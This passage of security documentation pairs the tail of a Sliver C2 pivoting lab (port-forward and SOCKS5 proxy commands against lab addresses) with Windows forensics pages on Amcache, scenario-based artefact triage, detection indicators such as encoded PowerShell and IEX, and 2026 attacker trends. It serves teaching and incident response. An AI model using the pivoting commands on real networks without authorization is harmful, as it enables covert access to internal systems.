socks5 start --host 127.0.0.1 --port 1080
socks5

This creates a local SOCKS5 listener. Unlike the fixed forward, its start command does not specify the final internal service. The application supplies that destination through the SOCKS protocol. SOCKS5 flags, listener implementation

In a separate operator Linux terminal:

curl --noproxy "" --socks5-hostname 127.0.0.1:1080 --max-time 10 -i http://10.20.0.15:8000/
Part Meaning --socks5-hostname 127.0.0.1:1080 Use this SOCKS5 proxy; ask the proxy side to resolve a destination hostname when one is supplied --noproxy "" Prevent a NO_PROXY setting from bypassing the explicitly selected proxy http://10.20.0.15:8000/ The final requested service

This example uses a numeric IP, so destination DNS resolution does not change the outcome. A successful expected response supports this particular proxied request. curl option reference

Starting SOCKS5 does not redirect every program automatically. The client application must support SOCKS or use a suitable adapter. Sending ordinary HTTP directly to port 1080 does not perform a SOCKS handshake. These examples do not provide a general VPN or establish support for every protocol, UDP, or ICMP.

docs.title: Choose and verify the technique
docs.text:
Point Fixed port forward SOCKS5 Where the destination is specified Sliver portfwd add Each proxy-aware client connection Application's target in this example 127.0.0.1:18080 10.20.0.15:8000 through the proxy Application proxy configuration Unnecessary for this local TCP mapping Required Useful starting exercise One known service Clients that need selectable destinations

An HTTP 401 or 403 is an application-level response. It can show that an HTTP-speaking endpoint responded, while access remains restricted. Check the actual responder and message before blaming the tunnel or declaring the intended destination verified.

docs.title: End the exercise
docs.text:
In Sliver, list entries and remove only the IDs created for this exercise:

portfwd
portfwd rm --id <Forward_ID>
socks5
socks5 stop --id <Proxy_ID>

The two ID lists are separate. On the internal VM, stop the temporary HTTP server with Ctrl+C.

docs.title: Review questions
docs.text:
1. portfwd lists an entry. Has the internal service necessarily answered?
  2. SOCKS5 is listening. Will an ordinary client automatically use it?
  3. A tunnel reaches an SSH service. Has user authentication succeeded?
Answers and reasoning

1. No. A configured local listener and a successful end-to-end request are different observations. Test the intended application and inspect its result.

2. No. Configure SOCKS support or an appropriate adapter in that client. A listening proxy does not change all host traffic.

3. No. Reachability, authentication, and authorization are separate gates. The next lesson demonstrates this with a lab SSH account.

Previous: Identity and permissions · Next: Web-server-to-SSH lab

docs.title: Windows Forensics
docs.text: Host-based artifacts on Windows — where they live, what they prove, how to parse them. Start from the question you need to answer, then open the artifact pages.

docs.title: Artifact map — by question
docs.text: Question Primary artifacts Also check Did this program run? When? How often? Prefetch · BAM/DAM (Registry) · Security 4688 / Sysmon 1 (Event logs) Shimcache (existence + order), Amcache, UserAssist, SRUM (hourly, with user) What was that binary? (renamed / deleted) Amcache — SHA-1 Prefetch file references, $MFT resident data, MUICache Which user ran it? BAM/DAM, UserAssist, SRUM, 4688 SubjectUserName LNK / Jump Lists under that profile Which files/folders did the user open? LNK / Jump Lists · RecentDocs, OpenSavePidlMRU, Office MRU (Registry) ShellBags (folders), Office Trusted Documents (macro docs) What happened to a file — created, renamed, deleted, stomped? $UsnJrnl + $MFT $LogFile, $I30 slack, Sysmon 11, 4663 Where did the file come from? Zone.Identifier ADS in $MFT (URL) Browser history, LNK volume serial (USB), 5145 share access Was a USB device plugged in? Which one? Who used it? USBSTOR, MountedDevices, MountPoints2 (Registry) setupapi.dev.log, Partition/Diagnostic 1006, LNK to E:\ Did data leave the machine? How much? SRUM Network Usage — bytes per app per hour $UsnJrnl archive creation, Sysmon 3, proxy/firewall/Zeek How did they get in / move laterally? 4624 type 3/10, 4648, 4778, RDP 21/25/1149, 7045, 5140/5145 (Event IDs) WinRM / WMI-Activity channels, Prefetch for psexesvc, wsmprovhost How do they persist? Run keys, Services, Scheduled tasks, WMI, COM hijack (Registry ASEP) 7045, 4698, WMI 5861, Startup folders, Autoruns offline Was logging tampered with? 1102, 104, 4719, record-ID gaps (Event logs) Oldest event per channel, $UsnJrnl vs. empty logs, VSS copies What's the system, timezone, users, network? CurrentVersion, TimeZoneInformation, ProfileList, NetworkList, SAM (Registry) setupapi, DHCP lease in Tcpip\Parameters

docs.title: Artifact pages
docs.text:
• Prefetch — execution, last 8 run times, files touched
  • Amcache — SHA-1 of every binary seen
  • Shimcache — existence & order; works on servers
  • Registry keys — identity, user activity, USB, persistence
  • LNK & Jump Lists — files/folders opened, USB serials
  • $MFT / $UsnJrnl / $LogFile — file system history, timestomping
  • SRUM — bytes sent per app per hour, with user
  • Event logs — channels, retention, parsing, tampering
  • Identifying artefacts by scenario — normal vs suspicious, what context to ask, which artefact next

docs.title: Collection order (when time is short)
docs.text:
1. Memory (if the box is live and you can) — then everything else.
  2. $MFT, $UsnJrnl:$J, $LogFile — cheap, huge payoff.
  3. Registry hives + transaction logs (SYSTEM, SOFTWARE, SAM, SECURITY, every NTUSER.DAT + UsrClass.dat), Amcache.hve.
  4. C:\Windows\System32\winevt\Logs\*.evtx.
  5. C:\Windows\Prefetch\, C:\Windows\System32\sru\, users' Recent\ (LNK + Jump Lists), PowerShell ConsoleHost_history.txt.
  6. Browser data, Tasks\, Startup folders, Temp directories, setupapi.dev.log.

KAPE's !SANS_Triage compound target covers all of the above in a few minutes; Velociraptor's Windows.KapeFiles.Targets does the same remotely.

Adding a page here

python new.py windows/<name> -t artifact — or just drop a .md file in docs/windows/. It appears in the sidebar automatically.

docs.title: Amcache
docs.text:
Category: Evidence of execution / program inventory · OS: Windows 7 (with update) → 11 · Last updated: 2026-09-16

In one sentence

Amcache.hve is a registry hive that inventories executables, drivers and installed programs the system has seen — most valuable because it stores the SHA-1 hash of the file, so you can identify a renamed or deleted tool with certainty.

docs.title: What it tells you
docs.text:
• Full path, file size, publisher, product/version metadata (from the PE version resource), compile (link) time, and SHA-1 of the first 31,457,280 bytes (30 MB) of the file.
  • The first time Windows became aware of the binary (the key's last-write time) — often, but not always, the first execution.
  • Installed programs (from MSI/uninstall data), drivers, shortcuts, device PnP info.

Execution is inferred, not proven

Entries are created by the Application Experience / Compatibility Appraiser scheduled task (\Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser) and by the shim engine when a process launches. A file can appear because it was scanned (e.g. sitting in Program Files) rather than executed. Treat Amcache as "this binary existed here, this is its hash", and use Prefetch / 4688 / Sysmon 1 to prove execution.

docs.title: Location
docs.text: Item Path Hive C:\Windows\AppCompat\Programs\Amcache.hve (+ .LOG1, .LOG2 transaction logs — collect them too) Predecessor (XP/7) C:\Windows\AppCompat\Programs\RecentFileCache.bcf — path only, no hash Locked while running Yes — use raw copy (KAPE, FTK Imager, esentutl-style volume shadow)

docs.title: Structure (Windows 10 1709+ format)
docs.text:
Key What it inventories Key fields Root\InventoryApplicationFile Executables seen (one subkey per file, named <lowercase path>|<hash>) LowerCaseLongPath, Name, Size, FileId (0000 + SHA-1), Publisher, ProductName, ProductVersion, BinFileVersion, LinkDate, BinaryType, ProgramId, IsOsComponent, IsPeFile Root\InventoryApplication Installed programs (MSI, uninstall entries, Store apps) Name, Publisher, Version, InstallDate, RootDirPath, Source (Msi/AddRemoveProgram/…), UninstallString, ProgramId Root\InventoryApplicationShortcut .lnk shortcuts in Start menu / desktop ShortcutPath, ShortcutTargetPath Root\InventoryDriverBinary Drivers (.sys) DriverName, DriverId (SHA-1), DriverSigned, DriverCompany, DriverLastWriteTime Root\InventoryDevicePnp PnP devices Class, manufacturer, driver, InstallDate Root\InventoryDeviceContainer Device containers (USB devices, etc.) FriendlyName, Manufacturer, ModelName

Older format (Win 8 – 10 1607) used Root\File\<VolumeGUID>\<FileRef> with numbered values: 15 = full path, 101 = SHA-1, 17 = last modified, 0F = link date, 11 = created, 100 = program ID.

Which timestamp is which

The key LastWrite time on an InventoryApplicationFile entry = when the appraiser wrote/updated the entry (≈ first-seen, and may be refreshed). LinkDate = PE compile time from the header (attacker-controllable). There is no reliable "last executed" timestamp in Amcache.

docs.title: How to collect
docs.text:
KAPEVelociraptorLive copy 
kape.exe --tsource C: --tdest C:\Case\out --target Amcache --mdest C:\Case\mod --module AmcacheParser

Windows.System.Amcache — parses the live hive via raw NTFS read.

# Locked — use a shadow copy or a raw-reading tool.  RawCopy example:
RawCopy.exe /FileNamePath:C:\Windows\AppCompat\Programs\Amcache.hve /OutputPath:C:\Case

docs.title: How to parse
docs.text:
AmcacheParser (Eric Zimmerman)RegRipperPlaso 
# Full parse → several CSVs (UnassociatedFileEntries, AssociatedFileEntries, Programs, Drivers, Shortcuts, Devices…)
AmcacheParser.exe -f C:\Case\Amcache.hve --csv C:\Case\out

# Only files NOT tied to an installed program (where attacker tools live) + include Windows OS files
AmcacheParser.exe -f C:\Case\Amcache.hve --csv C:\Case\out -i

# Whitelist known-good hashes to shrink output
AmcacheParser.exe -f C:\Case\Amcache.hve --csv C:\Case\out -w C:\Case\known_good_sha1.txt

The most useful output is *_UnassociatedFileEntries.csv: binaries that are not part of any installed product. Sort by FileKeyLastWriteTimestamp.

rip.pl -r Amcache.hve -p amcache

log2timeline.py --parsers amcache out.plaso Amcache.hve

docs.title: Analysis tips
docs.text:
Hash first, name second

Take every SHA-1 from UnassociatedFileEntries, drop the leading 0000, and check against VirusTotal / your threat-intel. A file called svchost.exe whose SHA-1 is Mimikatz ends the argument.

  • Renamed tools: Amcache keeps the on-disk name and the PE resource ProductName/OriginalFileName-derived fields. Name = update.exe, ProductName = "mimikatz" happens more often than you'd think.
  • Deleted binaries: Amcache entries survive deletion of the file. Pair with $MFT/USN to reconstruct when it was dropped and removed.
  • Unsigned / no publisher binaries in Users\*, ProgramData, Windows\Temp, Users\Public in the incident window are the first things to pull.
  • LinkDate sanity: a compile time in the future or 1970/2000-ish suggests a packed or forged header.
  • Drivers: InventoryDriverBinary with DriverSigned = 0 or an unusual DriverCompany → BYOVD (bring-your-own-vulnerable-driver) attacks and rootkits.
  • Don't over-read the timestamp — the appraiser task runs roughly daily; an entry's last-write may be hours after actual first execution, or refreshed later.

docs.title: Timeline / correlation
docs.text: Question Cross-check with Did it actually run, and when? Prefetch, Security 4688, Sysmon 1, BAM/DAM Does this hash match a known tool? VirusTotal, MISP, internal hash sets Where did it come from? USN journal FILE_CREATE, Zone.Identifier ADS ($MFT), browser history, 4663 Same tool on other hosts? Fleet-wide Velociraptor hunt on the SHA-1 Program installed vs. dropped? InventoryApplication vs UnassociatedFileEntries

docs.title: References
docs.text:
• Blanche Lagny — Analysis of the AmCache (ANSSI, 2019)
  • Eric Zimmerman — AmcacheParser
  • 13Cubed — Amcache and Shimcache in forensic analysis

docs.title: Identifying Artefacts by Scenario
docs.text:
Category: Triage methodology · OS: Windows · Last updated: 2026-10-09

A single artefact rarely proves anything on its own. The same trace can be routine or malicious depending on who, when, where and how. This page gives a repeatable way to judge an artefact, decide what context you need, and pick the next artefact that confirms or rules it out.

docs.title: The three-step method
docs.text:
1. Classify — is it likely normal, possibly suspicious or definitely suspicious?
  2. Ask for context — the question that decides whether the behaviour is expected. Is this a known admin task? Is remote access expected for this user?
  3. Find the next artefact — the evidence that answers that question. 4624 logons, VPN logs, Prefetch, USBSTOR.

Rule of thumb

Context is the question. The next artefact is the evidence that answers it.

When a baseline exists, sort every deviation into one of three buckets: normal variation (documented reason, no security impact), potential misconfiguration (security weakened, no attack evidence yet) or suspicious/malicious (matches a known attack pattern).

docs.title: Six-question checklist
docs.text:
Question Leans normal Leans suspicious When? Business hours, scheduled maintenance (e.g. AV scan at 02:00) Overnight, weekends, leave, off-pattern times Where from? Internal IP, corporate VPN, usual location New external IP, overseas, hosting/VPS ranges Who? Account fits the job; admin doing admin work Intern or standard user on sensitive data; service account logging on interactively Which path? C:\Program Files, C:\Windows\System32 %Temp%, %AppData%, Downloads, C:\Users\Public, C:\ProgramData What does it look like? Signed binary, recognisable name Double extension (invoice.doc.exe), random name, Base64/obfuscation, look-alike names (svch0st.exe) What changed? Documented change with a change request New autorun, weakened security settings, cleared logs, AV stopped

One hit → possibly suspicious. Two or three together → definitely suspicious. "03:00 + %Temp% + obfuscated PowerShell" is three hits.

These are definitely suspicious on their own:

  • An autorun location (Run/RunOnce, scheduled task, service) pointing at a random name or a temp path
  • Encoded or obfuscated PowerShell (-enc, FromBase64String, IEX)
  • Security or antivirus logs cleared manually
  • An executable with a double extension

docs.title: 1. Logons and remote access
docs.text:
• Normal: internal IP during business hours.
  • Suspicious: overnight logons, external IPs, impossible travel, failures followed by success.
  • Context: external IP → approved IP list, user role, login history. Internal movement (RDP, SMB) → is remote access expected for that user/system?
  • Next artefact: Security 4624/4625/4634/4647/4648, logon type (3 network, 10 RDP), VPN logs, RDP logs (TerminalServices-LocalSessionManager 21/24/25, RemoteConnectionManager 1149).

docs.title: 2. PowerShell and scripts
docs.text:
• Normal: an admin running a signed script from a known location.
  • Suspicious: execution from %Temp%, -enc / -w hidden / -nop, FromBase64String, IEX, DownloadString.
  • Context: is it a known admin task? What does the script contain? What is the parent process?
  • Next artefact: PowerShell 4104 (script block — the decoded code), 4103 (module logging), 4688 / Sysmon 1 (process and command line), ConsoleHost_history.txt, process tree.

docs.title: 3. Persistence
docs.text:
• Normal: documented entries such as antivirus or updater services.
  • Suspicious: random names under Run/RunOnce, tasks on short intervals (e.g. every 30 minutes), services pointing at temp folders.
  • Context: was it in the baseline? Who created it and when? What file does it launch?
  • Next artefact: HKCU/HKLM\...\CurrentVersion\Run and RunOnce, C:\Windows\System32\Tasks\, 4698 (task created), 7045 (service installed), binary path/hash/signature, Autoruns.

docs.title: 4. DNS and network
docs.text:
• Normal: microsoft.com, internal *.local names.
  • Suspicious: random-looking domains (possible DGA, e.g. xf21zy.biz), newly registered domains, external 443 from a host that should only reach an internal database, regular beaconing.
  • Context: domain age, WHOIS, threat-intel reputation, does this host normally talk to the internet?
  • Next artefact: DNS, firewall and proxy logs, PCAP, Zeek conn.log / dns.log / ssl.log, Sysmon 3 and 22, the process that opened the connection.

docs.title: 5. Files and executables
docs.text:
• Normal: signed installer from an official source.
  • Suspicious: double extensions, update.exe run from Downloads, unsigned binaries, name impersonation.
  • Context: where did the file come from? Did the user knowingly download it? Is it a legitimate update?
  • Next artefact: hash + VirusTotal, digital signature, Zone.Identifier (source URL), Prefetch (execution and count), Amcache, Shimcache, browser download history.

docs.title: 6. USB and data exfiltration
docs.text:
• Normal: approved device during work hours.
  • Suspicious: device connected overnight on a no-USB host, bulk file access right after connection, uploads to external FTP or cloud storage.
  • Context: work schedule, USB policy, sensitivity of files touched.
  • Next artefact: USBSTOR, MountedDevices, setupapi.dev.log (first connection), Partition/Diagnostic 1006, LNK and Jump Lists (files opened from the device), Shellbags.

docs.title: 7. Browser extensions
docs.text:
• Normal: extensions on the allow list.
  • Judgement: not on the list but no malicious evidence → start at policy violation / misconfiguration. Excessive permissions (read all sites, cookies), outbound data or sideloading → malicious.
  • Context: source (store or sideloaded), requested permissions, who installed it.
  • Next artefact: ...\User Data\Default\Extensions\<ID>\manifest.json, Preferences / Secure Preferences, extension ID reputation, proxy logs.

docs.title: 8. Log clearing and defence evasion
docs.text:
• Normal: retention-based log rollover.
  • Suspicious: manual clearing, AV disabled, new AV exclusions, audit policy changes.
  • Context: who cleared them? Was there a recent malware detection?
  • Next artefact: 1102 (Security log cleared), 104 (System log cleared), 4719 (audit policy changed), Defender 5001/5007, last scan results, copies in the SIEM.

docs.title: 9. Privilege and policy changes
docs.text:
• Normal: admin change backed by a change request.
  • Judgement: weakening security (e.g. password complexity disabled) → potential misconfiguration until proven otherwise. A standard user modifying a logon script → suspicious.
  • Context: group policy permissions, user privileges, change records.
  • Next artefact: 5136 (directory object changed), 4728/4732 (member added to group), 4670 (permissions changed), GPO version history, SYSVOL timestamps, registry changes.

docs.title: 10. Sensitive file access
docs.text:
• Normal: a user whose role fits, during work hours (HR staff opening the HR share at 13:00).
  • Suspicious: an intern opening payroll.xlsx, many files touched in a short time.
  • Context: job role, access rights, group membership.
  • Next artefact: 4663 (object access), 5140/5145 (share access), ACLs, access timestamps, group info, LNK and Jump Lists.

docs.title: Comparing against a baseline
docs.text:
Bucket Test Example Next step Normal variation Reason recorded, no security impact AV update moved 02:00 → 07:00 due to network latency No action if logs and policy agree Potential misconfiguration Security weakened, no attack evidence yet Password complexity disabled; unlisted browser extension Check change history; accidental or deliberate? Suspicious/malicious Matches a known technique 03:14 logon, new Run key, .ps1 task every 30 min, DGA domain, 01:12 USB, AV process missing Pull related artefacts and build a timeline

Order of review:

  1. What disappeared — a missing AV process matters more than a new one.
  2. What appeared — autoruns, tasks, services, extensions, accounts.
  3. What changed — policies, permissions, times, destinations.
  4. Put the times on one line — 01:12 USB → 03:14 logon → PowerShell → external 443. Weak signals alone become a clear story together.

No baseline? Compare with another host in the same role.

docs.title: 2026 trends that change what you look for
docs.text: Attackers increasingly use the user's own hands and legitimate tools instead of custom malware. Look for normal tools used abnormally.

docs.title: ClickFix variants — RunMRU is no longer enough
docs.text:
ClickFix tricks users into pasting and running a command from a fake CAPTCHA or error. The classic Win+R version leaves the command in HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU. Early-2026 variants use Win+X → I to open Windows Terminal instead, so RunMRU stays empty (trackr.live).

  • Check: explorer.exe, a browser or wt.exe spawning powershell/cmd/mshta/regsvr32/rundll32 (Sysmon 1, 4688 with command-line auditing), -w hidden / -enc / IEX, a first-seen domain right after, 4104, ConsoleHost_history.txt.
  • Note: RunMRU shows a command was entered, not that it succeeded. Padding with spaces can hide the real command.

docs.title: CrashFix — a browser extension as the lure
docs.text:
In January 2026 Huntress described CrashFix: a fake extension (NexShield, posing as uBlock Origin Lite) deliberately crashes the browser, then a fake "stopped abnormally" warning gets the user to paste a PowerShell command already on the clipboard. It waits an hour after install so the user doesn't connect the two (Cyber Security News).

  • Lesson: an unlisted extension starts as a policy issue, but extension install → browser crash → RunMRU/PowerShell on one timeline is malicious.

docs.title: RMM abuse — legitimate tools as C2
docs.text:
Huntress's 2026 Cyber Threat Report found RMM abuse up 277% year on year, while traditional hacking tools fell 53%. ScreenConnect, AnyDesk, Atera, NetSupport, PDQ Connect and Splashtop all feature (Dark Reading).

  • Judgement: is this RMM actually approved here? Even an approved product is suspicious if it connects to an unfamiliar tenant, account or relay.
  • Check: 7045, install path and signature, first execution in Prefetch/Amcache, the RMM's own connection logs (often under ProgramData), external relay domains.

docs.title: BYOVD and EDR killers
docs.text:
ESET's June 2026 analysis of GentleKiller (The Gentlemen ransomware) shows it loading a vulnerable or malicious kernel driver to kill 400+ processes from 48 security products, disguised with vendor-like names, fake version info and copied signatures (Security Affairs).

  • Judgement: a security process that vanished is a strong signal on its own.
  • Check: Sysmon 6 (driver loaded), 7045/4697, .sys files outside C:\Windows\System32\drivers, Defender 5001, driver hashes against LOLDrivers.

docs.title: Native Sysmon in Windows 11
docs.text:
In February 2026 Microsoft began shipping Sysmon as a built-in optional feature in Windows 11 Insider builds. It is off by default; enable the feature, then run sysmon -i, and events go to the Windows Event Log (BleepingComputer).

  • Meaning: more hosts will have Sysmon 1/3/6/13/22. At the start of an investigation, check whether Sysmon was on and which config it used — some public configs don't log per-user Explorer keys such as RunMRU.

docs.title: Quick reference
docs.text: Full lists: Windows event IDs · Registry keys · Event logs
